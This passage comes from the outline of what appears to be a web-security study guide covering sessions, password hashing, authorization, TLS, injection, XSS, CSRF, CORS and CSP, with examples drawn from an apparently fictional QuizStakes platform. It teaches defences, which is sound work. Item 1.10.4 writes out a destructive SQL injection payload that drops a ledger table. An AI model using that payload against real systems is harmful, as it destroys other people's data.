      encoded in it, no sequence, no user id, no timestamp. `[NUM]` `[SPEC]`
1.6.4 Where a session id may live: cookie (correct), URL (never — § 1.4.9), custom header (fine for
      non-browser clients), local/session storage (XSS-readable). `[TABLE]` `[TRAP]`
1.6.5 The session lifecycle as a state machine: anonymous → authenticated → (re-authenticated for
      step-up) → invalidated. Every transition is a security event. `[FLOW]`
1.6.6 **Session fixation**: the attacker plants a known session id, the victim authenticates into
      it, the attacker is now the victim. The two preconditions. The fix: **regenerate the session
      id on privilege change**. `[ATTACK]` `[PROVE]`
1.6.7 Spring Security's four session-fixation strategies —
      `changeSessionId` (default, servlet 3.1+), `newSession`, `migrateSession`, `none` — and what
      each does to attributes. `[API]` `[NUM]`
1.6.8 Idle timeout vs absolute timeout vs renewal timeout, all three, with the QuizStakes numbers:
      operator sessions live 30–90 minutes so an idle timeout of 15 minutes plus an absolute cap of
      8 hours is the shape. `[NUM]` `[TABLE]`
1.6.9 Logout done properly: invalidate server-side state, clear the cookie with the *same*
      attributes, `Clear-Site-Data`, revoke refresh tokens, and end the OIDC session at the provider
      (RP-initiated logout). A client-side-only logout is not a logout. `[FLOW]` `[TRAP]`
1.6.10 Concurrent session control: maximum sessions per principal, `SessionRegistry`,
       `maximumSessions`, `maxSessionsPreventsLogin`, and the "log me out everywhere" feature.
       `[API]`
1.6.11 "Remember me" — the persistent-token scheme (series + token, rotate on use) vs the hash-based
       scheme, and why the hash-based one is a password-equivalent in a cookie. `[API]` `[TRAP]`
1.6.12 Where server-side session state lives: in-memory (does not survive a restart or scale out),
       sticky sessions (fragile — one pod restart logs users out), shared store (Redis/JDBC via
       Spring Session), client-side signed state. The trade table. `[TABLE]` `[X-REF 15]`
1.6.13 Sticky sessions as a *security-relevant* choice: they make session state a single point of
       failure and complicate revocation. QuizStakes uses affinity for `InternalPlatforms`
       deliberately. `[SOURCE]`
1.6.14 Binding a session to context (IP, user agent, TLS session) — why it sounds good, why it
       breaks mobile users on carrier NAT, and where it is still worth it (operator sessions).
       `[TRAP]`
1.6.15 Session-related events worth auditing: creation, authentication, privilege change, failure,
       expiry, concurrent-session eviction, logout. `[X-REF 20]`
1.6.16 `HttpSession` mechanics in Spring: `SecurityContextRepository`,
       `HttpSessionSecurityContextRepository`, `RequestAttributeSecurityContextRepository`,
       `SessionCreationPolicy` (`ALWAYS`, `IF_REQUIRED`, `NEVER`, `STATELESS`), and what
       `STATELESS` actually turns off. `[API]` `[VERSION-TRAP]`

*(16 leaves)*

## §1.7 Authentication — the basics

1.7.1 The three factor categories (knowledge / possession / inherence) and the fourth and fifth
      people add (location, behaviour). Why "password + security questions" is one factor.
      `[PROVE]` `[TRAP]`
1.7.2 The authentication decision as a function: `(claimed identity, evidence) → (identity,
      assurance level)`. Storing only the boolean loses the assurance level you later need for
      step-up. `[PROVE]`
1.7.3 The registration/onboarding flow as an attack surface: account enumeration, email
      verification, race on unique constraints, pre-hijacking of unverified accounts. Mapped onto
      QuizStakes `AO-*`. `[ATTACK]` `[RESEARCH]`
1.7.4 **Never store passwords recoverably.** Encryption is wrong because it is reversible and the
      key lives in the same blast radius; there is no legitimate need to recover a password.
      "Email me my password" is a design defect. `[PROVE]`
1.7.5 **Never plain-hash.** MD5/SHA-1/SHA-256 are designed to be fast — billions of guesses/sec on a
      GPU — and identical passwords produce identical digests, so one rainbow table cracks the whole
      dump at once. `[PROVE]` `[NUM]`
1.7.6 **Salt** — unique random per-password value stored alongside the hash. What it defeats
      (rainbow tables, cross-user comparison) and what it does *not* (a targeted brute force on one
      account). `[PROVE]` `[TRAP]`
1.7.7 **Work factor** — the attacker pays it per guess, the user pays it once. The calibration rule
      (as high as your verification latency budget allows) and the re-calibration duty.
      `[PROVE]` `[NUM]`
1.7.8 **Memory hardness** — Argon2id and scrypt require RAM as well as time, which is what blunts
      GPU/ASIC parallelism, because silicon area for memory does not shrink like silicon area for
      hashing. `[PROVE]`
1.7.9 The current parameter set, verbatim: **Argon2id** `m=47104 (46 MiB), t=1, p=1` through the
      equal-security ladder to `m=7168 (7 MiB), t=5, p=1`; **scrypt** `N=2^17 (128 MiB), r=8, p=1`
      through `N=2^13 (8 MiB), r=8, p=10`; **bcrypt** work factor ≥ 10; **PBKDF2-HMAC-SHA256**
      600 000 iterations, **-SHA512** 220 000, **-SHA1** 1 400 000 (legacy only). `[NUM]`
      `[VERSION-TRAP]` `[RESEARCH]`
1.7.10 Choosing between them: Argon2id first; scrypt if Argon2 is unavailable; bcrypt where it is
       already everywhere; PBKDF2 when FIPS compliance demands it. `[TABLE]`
1.7.11 **bcrypt's 72-byte truncation**, and the two consequences: enforce a matching maximum length,
       and if you pre-hash to work around it, the **null-byte collision** problem means the
       pre-hash must be base64-encoded — OWASP's construction is
       `bcrypt(base64(hmac-sha384(data:$password, key:$pepper)), $salt, $cost)`. `[NUM]` `[SOURCE]`
       `[RESEARCH]`
1.7.12 **Password shucking** — why a naive `bcrypt(md5(password))` migration is exploitable, and how
       the HMAC-with-pepper construction blocks it. `[ATTACK]` `[RESEARCH]`
1.7.13 **Pepper** — a secret key applied in addition to the salt, stored *outside* the database
       (secrets manager or HSM). What it buys when only the DB leaks, and its cost: rotating it
       forces a password reset. `[PROVE]` `[SOURCE]`
1.7.14 **Constant-time comparison** for the final verification and for any token compare —
       `MessageDigest.isEqual`, not `String.equals`. `[API]` `[PROVE]`
1.7.15 Algorithm migration without invalidating logins: the `{id}` prefix format,
       `DelegatingPasswordEncoder`, `PasswordEncoderFactories.createDelegatingPasswordEncoder()`,
       and the rehash-on-successful-login pattern (`upgradeEncoding`). `[API]` `[SOURCE]`
1.7.16 NIST SP 800-63B-4's actual rules, which invert the folklore: minimum 8 (15 recommended),
       maximum ≥ 64, accept all printable ASCII **and Unicode**, allow paste, **no composition
       rules**, **no forced periodic rotation**, **blocklist-check against breach corpora**, no
       knowledge-based "security questions". `[SPEC]` `[NUM]` `[VERSION-TRAP]`
1.7.17 Breach-list checking mechanics: the Have I Been Pwned range API's **k-anonymity** design —
       send the first 5 hex characters of the SHA-1, receive all matching suffixes, compare locally,
       so the service never learns the password. `[NUM]` `[PROVE]`
1.7.18 Password-reset flow done correctly, step by step: single-use high-entropy token, short TTL,
       stored hashed, bound to the account, invalidated on use and on password change, no user id
       in the URL, no enumeration in the response, all sessions invalidated after reset, and the
       `Host`-header trap from § 1.4.10. `[FLOW]` `[ATTACK]`
1.7.19 Credential storage for **non-human** identities: API keys (hash them like passwords, prefix
       them so scanners can detect leaks, scope them), client secrets, and why "hashed API keys mean
       we cannot show it again" is the correct behaviour. `[PROVE]`
1.7.20 Spring Security's authentication mechanisms, enumerated: form login, HTTP Basic, HTTP Digest
       (deprecated), remember-me, X.509, JAAS, SAML 2.0, OAuth2/OIDC login, OAuth2 resource server
       (JWT and opaque), pre-authentication, one-time token, passkeys/WebAuthn. `[TABLE]` `[API]`
       `[VERSION-TRAP]`

*(20 leaves)*

## §1.8 Authorization — the basics

1.8.1 Authorization as a decision function: `(subject, action, resource, environment) → permit|deny`.
      Every model below is a way of writing that function. `[PROVE]`
1.8.2 **Broken access control is the #1 risk in every OWASP list** — A01:2021, A01:2025, API1:2023
      and API5:2023 — and the reason is structural: there is no framework default that knows your
      ownership rules. `[PROVE]` `[VERSION-TRAP]`
1.8.3 **IDOR / broken object-level authorization**: `GET /deposits/DEP-88214` returns another
      client's deposit because the code checked "is authenticated" and never "does this deposit
      belong to this client". `[ATTACK]`
1.8.4 The fix stated as a rule: **every query for a user-owned resource is filtered by owner in the
      query**, `findByIdAndClientId(...)`, not `findById(...)` plus a check you can forget. Why
      "filter in the query" beats "check after load". `[PROVE]` `[API]`
1.8.5 **BOPLA / broken object property-level authorization** = excessive data exposure (returning
      fields the caller may not see) + **mass assignment** (accepting fields the caller may not
      set). The DTO discipline that fixes both. `[ATTACK]` `[TRAP]`
1.8.6 **BFLA / broken function-level authorization**: the endpoint that exists but was only ever
      linked from the admin UI. Vertical vs horizontal privilege escalation named precisely.
      `[PROVE]`
1.8.7 **Deny by default**: the only correct posture, and the two ways to implement it — `anyRequest()
      .authenticated()` as the terminal rule, and a default-deny policy engine. `[API]` `[PROVE]`
1.8.8 **RBAC**: roles → permissions. What it is good at (coarse, auditable, simple) and where it
      breaks (role explosion, no ownership, no context). `[TABLE]`
1.8.9 Spring Security's `ROLE_` prefix convention, and the `hasRole("ADMIN")` vs
      `hasAuthority("ROLE_ADMIN")` distinction that trips everyone. `[API]` `[TRAP]`
1.8.10 **ABAC**: policy over attributes of subject, resource, action, environment. Where it earns
       its complexity (the QuizStakes restriction decision: jurisdiction × product × account status
       × time). `[TABLE]`
1.8.11 **ReBAC**: authorization as a relationship graph (Google Zanzibar, OpenFGA, SpiceDB) — the
       model when "can this operator see this `PaymentRun`" is a graph query. `[RESEARCH]`
1.8.12 The pragmatic default: **RBAC for coarse function-level access plus an explicit ownership
       predicate at the data layer**, and add ABAC only where a real attribute drives the decision.
       `[PROVE]`
1.8.13 Other models worth naming: ACLs, capability/ticket-based, PBAC, MAC/DAC, and Spring
       Security's `AclService`/domain-object security. `[TABLE]` `[API]`
1.8.14 **Where the decision runs**: in-code, in a filter, in an aspect (`@PreAuthorize`), at the
       gateway, in a sidecar (OPA), in the database (row-level security). The centralisation vs
       locality trade-off, and the rule that the *object-level* check can only live where the object
       is. `[TABLE]` `[PROVE]`
1.8.15 **PDP / PEP / PAP / PIP** vocabulary, and why naming them makes "we use OPA" a coherent
       answer rather than a tool name.
1.8.16 The QuizStakes rule as the section's spine: **no token carries permissions, restrictions or
       account status**, so authorization is a live call to `ClientRestrictions` within a 30 ms
       budget — a cached claim would let a self-excluded client stake. State the latency/correctness
       trade-off explicitly. `[SOURCE]` `[NUM]` `[PROVE]`
1.8.17 Multi-tenancy as an authorization problem: the tenant id must come from the authenticated
       principal, never from the request, and every query must be tenant-scoped. The shared-cache-key
       leak. `[ATTACK]` `[X-REF 15]`
1.8.18 Authorization for **operators** vs **clients** as two different domains — `PaymentRun` is not
       a client state — and why mixing them in one role model produces the worst kind of escalation.
       `[SOURCE]`
1.8.19 Testing authorization: the matrix of (role × endpoint × resource-ownership), and why negative
       tests are the only tests that matter here. `[X-REF 16]`

*(19 leaves)*

## §1.9 Transport security — the basics

1.9.1 What TLS actually provides, precisely three things: **confidentiality**, **integrity**, and
      **server authentication**. And what it does not: nothing about the client's identity, nothing
      about the payload's safety, nothing after termination. `[PROVE]` `[TRAP]`
1.9.2 The threat TLS removes: the on-path attacker — passive eavesdropping, active modification,
      and impersonation. Coffee-shop Wi-Fi, transparent proxies, a compromised switch, a hostile
      transit provider. `[PROVE]`
1.9.3 Why "internal traffic does not need TLS" is wrong: the network is not a boundary, segmentation
      is not authentication, and lateral movement is the normal post-breach step. `[PROVE]`
      `[TRAP]`
1.9.4 The certificate as a **binding** of a public key to a name, vouched for by a CA, and the three
      checks a client must make: signature chain to a trusted root, name match (SAN, not CN), and
      validity window — plus revocation. `[FLOW]` `[SPEC]`
1.9.5 The trust store as the actual root of trust, and what "trusting ~150 CAs" means for your
      threat model.
1.9.6 Versions: TLS 1.0/1.1 deprecated (RFC 8996), **1.2 as the floor**, **1.3 preferred** —
      1-RTT handshake, encrypted certificate, all-AEAD cipher suites, renegotiation and compression
      removed. `[NUM]` `[SPEC]`
1.9.7 **HSTS** (`Strict-Transport-Security`) with `max-age`, `includeSubDomains`, `preload`; the
      bootstrap problem it does not solve and the preload list that does; the `max-age=0` escape
      hatch; and the operational commitment `includeSubDomains` represents. `[HDR]` `[NUM]`
1.9.8 HTTP→HTTPS redirect as a *fallback*, not a control — the first request is still plaintext.
      `[PROVE]`
1.9.9 **mTLS**: both sides present certificates, so the server learns a cryptographic client
      identity. Where it is the right answer (service-to-service in a mesh, high-assurance B2B) and
      its real cost (issuance, distribution, rotation, revocation). `[TABLE]`
1.9.10 Certificate lifecycle as an operational risk: expiry is the single most common TLS outage,
       ACME/Let's Encrypt automation, short-lived certificates as a revocation strategy.
       `[X-REF 18]`
1.9.11 What terminating TLS at a load balancer means for your guarantees, and re-encryption to the
       origin. `[X-REF 10]`
1.9.12 The Java surface: `KeyStore` vs `TrustStore`, JKS vs PKCS#12, `javax.net.ssl` system
       properties, `SSLContext`, `HttpClient` configuration, and Spring Boot's `server.ssl.*` /
       `spring.ssl.bundle.*` (SSL bundles). `[API]` `[NUM]` `[RESEARCH]`

*(12 leaves)*

## §1.10 The injection family, stated once

1.10.1 The single mechanism behind every injection: **untrusted data crosses into a context where it
       is parsed as code/structure**. Name the interpreter and you have named the injection.
       `[PROVE]`
1.10.2 The taxonomy, one row each with the interpreter and the safe API: SQL, NoSQL (Mongo operator
       injection), ORM/JPQL/HQL, OS command, LDAP, XPath, XQuery, XML/XXE, SSTI (SpEL, Thymeleaf,
       Freemarker, Velocity), expression-language, header/CRLF, log injection, email/SMTP header,
       CSV/formula, regex (ReDoS as injection-adjacent), GraphQL, path traversal, deserialization,
       prototype pollution, JNDI. `[TABLE]`
1.10.3 The three-part fix pattern that generalises: **separate code from data structurally**
       (parameterization), **validate against an allowlist where structure cannot be separated**
       (identifiers), **encode for the destination context where data must be embedded** (output).
       `[PROVE]`
1.10.4 **SQL injection**, mechanically: string concatenation lets input become syntax —
       `'; DROP TABLE ledger_entry; --` — and the classes of exploitation: in-band/union,
       error-based, blind boolean, blind time-based, out-of-band, second-order. `[ATTACK]`
1.10.5 **Prepared statements, and why the mechanism matters**: the SQL text with `?` placeholders is
       sent and *parsed into a plan first*; values are then bound as data to an already-fixed plan.
       There is no path by which a value becomes syntax. Categorically different from escaping,
       which is a denylist you can get wrong. `[PROVE]` `[SPEC]`
1.10.6 The safe Java APIs, exactly: `JdbcClient`/`JdbcTemplate` with `?` args, `NamedParameterJdbcTemplate`,
       `PreparedStatement.setX`, `EntityManager.createQuery(...).setParameter(...)`, Spring Data
       derived queries, `@Query` with named parameters, jOOQ, MyBatis `#{}`. `[API]` `[CODE]`
1.10.7 The unsafe siblings that look safe: `@Query(nativeQuery = true)` with concatenation, MyBatis
       `${}`, `Statement.execute`, JPA `Specification` building raw SQL fragments, Hibernate
       `createNativeQuery`, dynamic `ORDER BY` interpolation. `[TRAP]` `[ATTACK]`
1.10.8 **What parameters cannot do**: table names, column names, `ORDER BY` direction, `LIMIT` in
       some drivers, and `IN` lists in some drivers — these are syntax, so the fix is an
       **allowlist** of known identifiers plus a mapping table. `[PROVE]` `[BUILD]`
1.10.9 Command injection: `ProcessBuilder` with a **list of arguments** (no shell), never
       `Runtime.exec(String)` or `sh -c`; argument-injection (leading `-`) as the residual risk even
       without a shell. `[API]` `[TRAP]`
1.10.10 Log injection: newline and control-character stripping before logging, and the CRLF forgery
        that lets an attacker write fake audit lines. `[ATTACK]` `[X-REF 20]`
1.10.11 Stored procedures and ORMs as *partial* mitigations often quoted as complete ones — a stored
        procedure that concatenates is injectable inside the database. `[TRAP]`
1.10.12 Least-privilege database accounts as the containment layer: the app's user cannot `DROP`,
        cannot read other schemas, and cannot `COPY` to the filesystem. `[PROVE]` `[X-REF 09]`
1.10.13 What a WAF does and does not do for injection: it buys time during an emergency and produces
        false confidence the rest of the time. `[TRAP]`

*(13 leaves)*

## §1.11 XSS

1.11.1 The definition that keeps it precise: attacker-supplied content is **executed as script in
       another user's browser, in your origin**, and therefore inherits everything your origin can
       do. `[PROVE]`
1.11.2 What an attacker gets from XSS, enumerated, so the severity is not hand-waved: read the DOM,
       read non-`HttpOnly` cookies and `localStorage`, make authenticated same-origin requests
       (defeating CSRF tokens), keylog, rewrite the page, install a service worker for persistence,
       and pivot. `[PROVE]`
1.11.3 The three classic types: **stored** (persisted and served to everyone), **reflected**
       (echoed from the request), **DOM-based** (client-side JS writes untrusted data into a sink).
       `[TABLE]`
1.11.4 The types people forget, from the interview surface: **self-XSS** (and why it is still
       reportable when combined with clickjacking), **blind XSS** (fires in an admin console —
       QuizStakes `InternalPlatforms` reviewing an uploaded document's filename), **mutation XSS
       (mXSS)**, **universal XSS (uXSS)**, and **server-side XSS via template injection**.
       `[TABLE]` `[RESEARCH]`
1.11.5 **Source → sink** as the analysis frame, with the sources (`location.*`, `document.referrer`,
       `postMessage` data, `name`, storage, cookies) and the sinks (`innerHTML`, `outerHTML`,
       `document.write`, `insertAdjacentHTML`, `eval`, `setTimeout(string)`, `Function`,
       `element.src`/`href` with `javascript:`, `srcdoc`, `jQuery.html()`, framework
       `dangerouslySetInnerHTML` / `th:utext` / `v-html`). `[TABLE]`
1.11.6 **Safe sinks** as the primary DOM-XSS fix: `textContent`, `insertAdjacentText`,
       `setAttribute` with a hardcoded attribute name, `formfield.value`. "Use the right sink" beats
       "sanitize the string". `[PROVE]` `[SOURCE]`
1.11.7 **Context-aware output encoding** as the primary defence for server-rendered HTML, with the
       five contexts and a different encoder for each: HTML body, HTML attribute (quoted vs
       unquoted), JavaScript string, CSS value, URL parameter. The same input string requires five
       different outputs. `[TABLE]` `[PROVE]`
1.11.8 The **dangerous contexts where encoding is not enough**: inside an event-handler attribute,
       inside `<script>` as anything but a JSON-encoded string, a whole URL in `href`/`src` (the
       `javascript:` scheme), a CSS `url()`, and any attribute whose name is attacker-controlled.
       `[PROVE]` `[TRAP]`
1.11.9 The Java tools by name: **OWASP Java Encoder** (`Encode.forHtml`, `forHtmlAttribute`,
       `forJavaScript`, `forUriComponent`, `forCssString`), Thymeleaf's `th:text` (escaping) vs
       `th:utext` (not), `HtmlUtils.htmlEscape`, Jackson's JSON escaping. `[API]`
1.11.10 **HTML sanitization** for the case where the user legitimately submits markup: allowlist
        parse-and-rebuild with **OWASP Java HTML Sanitizer** (server) or **DOMPurify** (client) —
        never a regex, never a denylist of `<script>`. `[API]` `[PROVE]` `[TRAP]`
1.11.11 **CSP as defence in depth**, not as the primary fix: what it stops even when injection
        succeeds, and what it cannot stop (data exfiltration via allowed destinations, DOM
        manipulation, `<meta>` refresh).
1.11.12 `HttpOnly` cookies as containment: raises the cost from "steal the session" to "act within
        the session", which is a real reduction and not a fix. `[PROVE]`
1.11.13 `X-Content-Type-Options: nosniff` plus a correct `Content-Type` as the fix for
        upload-driven XSS. `[HDR]`
1.11.14 Framework defaults as the real-world story: React `{}`, Angular's sanitizer, Thymeleaf
        `th:text` escape by default, so **almost every modern XSS is at a bypass** —
        `dangerouslySetInnerHTML`, `bypassSecurityTrustHtml`, `th:utext`, `[innerHTML]`, or a
        `javascript:` URL bound to `href`. `[TRAP]`
1.11.15 The `X-XSS-Protection` header is dead — removed from Chrome, introduced its own info-leaks —
        and recommending it dates you. `[VERSION-TRAP]`

*(15 leaves)*

## §1.12 CSRF

1.12.1 The mechanism: the browser attaches ambient credentials for `quizstakes.example` to *any*
       request to `quizstakes.example`, including one triggered by a form or image on an attacker's
       page. The attacker cannot read the response — but the state change already happened.
       `[PROVE]` `[ATTACK]`
1.12.2 **CSRF applies only to ambient credentials**: cookies, HTTP Basic, Digest, NTLM/Negotiate,
       client certificates. An API that takes `Authorization: Bearer <token>` is not vulnerable,
       because the browser never attaches that header on its own. `[PROVE]`
1.12.3 The corollary that must be *justified*, never copied: `http.csrf(csrf -> csrf.disable())` is
       correct for a stateless Bearer-token API and catastrophic for a cookie-session app. You must
       be able to say which you are. `[API]` `[TRAP]`
1.12.4 The attacker's toolbox, by capability: auto-submitting `<form>` (POST, three content types
       only), `<img>`/`<script>`/`<link>` (GET), `fetch` with `mode: 'no-cors'`, and what each can
       and cannot set. This is why "our endpoint requires `application/json`" is a partial defence.
       `[TABLE]` `[PROVE]`
1.12.5 Defence 1 — **`SameSite` cookies**. `Lax` (the formal default) blocks cookies on cross-site
       POST while allowing top-level GET navigation; `Strict` is stronger but breaks inbound links;
       the two-minute Lax-allowing-unsafe window and older browsers are why this is not the only
       defence. `[NUM]` `[PROVE]` `[TRAP]`
1.12.6 Defence 2 — **synchronizer token**. A per-session (or per-request) random token in a hidden
       field or header that the attacker cannot read because SOP stops them reading your page.
       Spring Security's default for session apps. `[PROVE]`
1.12.7 Defence 3 — **double-submit cookie**, the stateless variant: token in a cookie and in a
       header, server compares. Its weakness: a related-domain attacker who can *write* cookies
       breaks it — hence signed/HMAC double-submit and the `__Host-` prefix. `[PROVE]` `[TRAP]`
1.12.8 Defence 4 — **`Origin`/`Referer` verification** as a secondary check, with the null/missing
       `Origin` cases you must decide about explicitly. `[HDR]`
1.12.9 Defence 5 — **Fetch Metadata** (`Sec-Fetch-Site: same-origin|same-site|cross-site|none`) as
       a modern, cheap, resource-isolation policy that covers CSRF and several cross-site-leak
       classes at once. `[HDR]` `[RESEARCH]`
1.12.10 Defence 6 — **custom-header requirement** (e.g. `X-Requested-With`) and why it works only
        because setting it forces a CORS preflight. The exact conditions under which a preflight is
        *not* sent, which is the same question as "what makes this defence hold". `[PROVE]`
1.12.11 What does **not** defend: checking `Content-Type` alone, POST-only, obscure parameter names,
        CAPTCHA on unrelated flows, and "we use JWTs" when the JWT is in a cookie. `[TRAP]`
1.12.12 **Login CSRF** and **logout CSRF** — the two cases people forget, and why the login form
        needs a token too. `[ATTACK]`
1.12.13 CSRF's relationship to XSS: XSS defeats every CSRF defence, because injected script runs
        same-origin and can read the token. Therefore CSRF defence is only meaningful on top of XSS
        defence. `[PROVE]`
1.12.14 Spring Security's CSRF surface: `CsrfFilter`, `CsrfToken`, `CsrfTokenRepository`
        (`HttpSessionCsrfTokenRepository` default; `CookieCsrfTokenRepository.withHttpOnlyFalse()`),
        `CsrfTokenRequestHandler`, the `_csrf` parameter, `X-CSRF-TOKEN` / `X-XSRF-TOKEN` headers,
        the `XSRF-TOKEN` cookie, the exempt safe methods (`GET`, `HEAD`, `OPTIONS`, `TRACE`), and
        `ignoringRequestMatchers`. `[API]` `[NUM]` `[SOURCE]`
1.12.15 The Spring Security 6 changes: `XorCsrfTokenRequestAttributeHandler` as default for
        **BREACH** mitigation (the rendered value differs per request), deferred `CsrfToken`
        loading, and the SPA breakage that made `csrf().spa()` necessary in 7.0. `[VERSION-TRAP]`
        `[RESEARCH]`

*(15 leaves)*

## §1.13 CORS

1.13.1 The framing that must come first: **CORS is a relaxation of the same-origin policy, enforced
       by the browser**. It is not a server-side access control and it does not protect your API.
       `[PROVE]`
1.13.2 The mechanism: the browser sends the request, the server answers with
       `Access-Control-Allow-Origin`, and **the browser** decides whether to hand the response body
       to the calling script. The request already executed. `[PROVE]` `[TRAP]`
1.13.3 Therefore: `curl`, Postman, a mobile app and any server-side client ignore CORS entirely.
       Authorization is what protects the API. `[PROVE]`
1.13.4 **Simple requests**, defined exactly: method in {`GET`, `HEAD`, `POST`}; only
       CORS-safelisted request headers (`Accept`, `Accept-Language`, `Content-Language`,
       `Content-Type`, `Range`); `Content-Type` restricted to
       `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`; no upload event
       listeners; no `ReadableStream` body. `[SPEC]` `[NUM]`
1.13.5 **Preflight**: `OPTIONS` with `Access-Control-Request-Method` and
       `Access-Control-Request-Headers`, answered with `Access-Control-Allow-Methods`,
       `-Allow-Headers`, and optionally `-Max-Age` to cache the decision. `[WIRE]` `[FLOW]`
1.13.6 The full header set, both directions, in one table: request (`Origin`,
       `Access-Control-Request-Method`, `-Request-Headers`) and response
       (`Access-Control-Allow-Origin`, `-Allow-Credentials`, `-Allow-Methods`, `-Allow-Headers`,
       `-Expose-Headers`, `-Max-Age`). `[TABLE]` `[HDR]`
1.13.7 **Credentialed requests**: `credentials: 'include'` requires
       `Access-Control-Allow-Credentials: true`, and **`Allow-Origin: *` is then illegal** — the
       browser blocks it. Same prohibition for `Allow-Headers: *` and `Allow-Methods: *`.
       `[SPEC]` `[PROVE]`
1.13.8 The **CORS-safelisted response headers** exposed to script by default — `Cache-Control`,
       `Content-Language`, `Content-Length`, `Content-Type`, `Expires`, `Last-Modified`, `Pragma` —
       and why anything else (a pagination header, a correlation id) needs
       `Access-Control-Expose-Headers`. `[NUM]` `[SPEC]`
1.13.9 **`Vary: Origin`** whenever `Allow-Origin` is computed per request, or a shared cache serves
       one tenant's CORS decision to another. `[HDR]` `[PROVE]` `[X-REF 15]`
1.13.10 **Trap: reflecting `Origin` with credentials enabled** is equivalent to
        `*`-with-credentials and hands any website full authenticated access to your API. The fix is
        a static allowlist. `[ATTACK]` `[TRAP]`
1.13.11 **Trap: sloppy allowlist matching** — `origin.endsWith("quizstakes.example")` matches
        `evilquizstakes.example`; regexes without anchors; allowing `null`; allowing `http://`;
        allowing all subdomains when one is user-content. `[ATTACK]` `[TRAP]`
1.13.12 What a CORS error actually means when debugging: the browser blocked the *read*; the
        server almost certainly processed the request; check the preflight, not the main request.
        `[TRAP]`
1.13.13 CORS and CSRF interaction: enabling permissive CORS with credentials converts read-only
        SOP protection into a full read/write compromise, and defeats the "custom header forces a
        preflight" CSRF defence. `[PROVE]`
1.13.14 The Spring surface and its two layers: `CorsConfiguration` /
        `UrlBasedCorsConfigurationSource` / `CorsFilter`, `@CrossOrigin`, `addCorsMappings`, and
        Spring Security's `http.cors(...)` — plus **why the Security filter chain must see CORS
        before authentication** or the preflight gets a 401. `[API]` `[TRAP]`
1.13.15 `allowedOriginPatterns` vs `allowedOrigins`, and why `allowedOrigins("*")` with
        `allowCredentials(true)` throws at startup in modern Spring. `[API]` `[NUM]`
1.13.16 Adjacent mechanisms that are not CORS but get confused with it: `crossorigin` attribute and
        CORS-enabled `<img>`/`<script>`, `Timing-Allow-Origin`, `crossOriginIsolated`, and Private
        Network Access / `Access-Control-Request-Private-Network`. `[RESEARCH]`

*(16 leaves)*

## §1.14 Security response headers and CSP

1.14.1 The header set that should be on every response, as one table with value, purpose and the
       attack it removes: `Strict-Transport-Security`, `Content-Security-Policy`,
       `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy`,
       `Cross-Origin-Opener-Policy`, `Cross-Origin-Embedder-Policy`,
       `Cross-Origin-Resource-Policy`, `Cache-Control` on authenticated responses. `[TABLE]`
       `[HDR]`
1.14.2 The retired set, and why naming them dates you: `X-XSS-Protection`, `Public-Key-Pins`
       (HPKP), `Expect-CT`, `Feature-Policy` (→ `Permissions-Policy`), `block-all-mixed-content`.
       `[VERSION-TRAP]`
1.14.3 `Referrer-Policy` values, all of them, with the leak each prevents:
       `no-referrer`, `no-referrer-when-downgrade`, `origin`, `origin-when-cross-origin`,
       `same-origin`, `strict-origin`, `strict-origin-when-cross-origin` (the modern default),
       `unsafe-url`. `[TABLE]` `[NUM]`
1.14.4 `Permissions-Policy` — the feature allowlist (`camera`, `microphone`, `geolocation`,
       `payment`, `usb`, `fullscreen`), the `()`/`(self)`/`(*)` syntax, and its role for embedded
       iframes. `[HDR]` `[RESEARCH]`
1.14.5 **CSP's purpose**: restrict which resources a document may load and execute, so that an
       injection that succeeds still cannot run attacker script. It is a *mitigation*, and treating
       it as the fix is the standard mistake. `[PROVE]`
1.14.6 CSP delivery: the `Content-Security-Policy` header, `Content-Security-Policy-Report-Only`,
       the `<meta http-equiv>` form and its limits, and multiple-policy intersection semantics.
       `[SPEC]`
1.14.7 The complete Level 3 directive list, grouped — **fetch directives**: `default-src`,
       `script-src`, `script-src-elem`, `script-src-attr`, `style-src`, `style-src-elem`,
       `style-src-attr`, `img-src`, `font-src`, `connect-src`, `media-src`, `object-src`,
       `frame-src`, `child-src`, `worker-src`, `manifest-src`, `fenced-frame-src`, `prefetch-src`
       (deprecated); **document directives**: `base-uri`, `sandbox`; **navigation directives**:
       `form-action`, `frame-ancestors`; **reporting**: `report-to`, `report-uri` (deprecated);
       **other**: `require-trusted-types-for`, `trusted-types`, `upgrade-insecure-requests`.
       `[TABLE]` `[SPEC]` `[NUM]`
1.14.8 The complete source-expression list: `'none'`, `'self'`, `'unsafe-inline'`, `'unsafe-eval'`,
       `'unsafe-hashes'`, `'strict-dynamic'`, `'report-sample'`, `'wasm-unsafe-eval'`,
       `'inline-speculation-rules'`, `'trusted-types-eval'`, `nonce-<base64>`,
       `sha256-`/`sha384-`/`sha512-<hash>`, host sources, scheme sources. `[TABLE]` `[NUM]`
1.14.9 **Why host allowlists fail**: one CDN with an open JSONP endpoint or an
       Angular/JSONP-serving path on an allowlisted host defeats the whole policy. Google's
       measurement of allowlist bypassability is the citable finding. `[PROVE]` `[RESEARCH]`
1.14.10 **The strict, nonce-based policy** as the recommended shape:
        `script-src 'nonce-{random}' 'strict-dynamic' https: 'unsafe-eval'; object-src 'none';
        base-uri 'none'`. Every token justified, including why `https:` and `'unsafe-eval'` are
        present as backwards-compatibility fallbacks that modern browsers ignore.
        `[SOURCE]` `[NUM]` `[RESEARCH]`
1.14.11 Nonce mechanics: a fresh CSPRNG value **per response** (never per session, never cached),
        placed on every legitimate `<script>`, and the requirement that the HTML not be cached
        without the nonce. `[PROVE]` `[TRAP]`
1.14.12 `'strict-dynamic'`: trust propagates from a nonce/hash-approved script to scripts it
        creates, and **allowlists and `'self'` are ignored** when it is present. `[SPEC]` `[PROVE]`
1.14.13 Hash-based policies for static inline scripts, and `'unsafe-hashes'` for inline event
        handlers as a migration crutch. `[NUM]`
1.14.14 The directives that matter even in a weak policy: `object-src 'none'` (Flash/plugin
        vectors), `base-uri 'none'` (base-tag hijacking of relative script URLs),
        `frame-ancestors 'none'` (clickjacking, superseding `X-Frame-Options`), `form-action`
        (form-action hijacking). `[PROVE]`
1.14.15 CSP reporting: `report-to` + the `Reporting-Endpoints` header, the report JSON body's
        fields, `'report-sample'`, and the operational reality that a public CSP report endpoint
        receives mostly browser-extension noise. `[HDR]` `[RESEARCH]`
1.14.16 The rollout procedure that actually works: `Report-Only` → measure → fix inline scripts →
        enforce → tighten. Plus the CSP evaluator tooling. `[FLOW]`
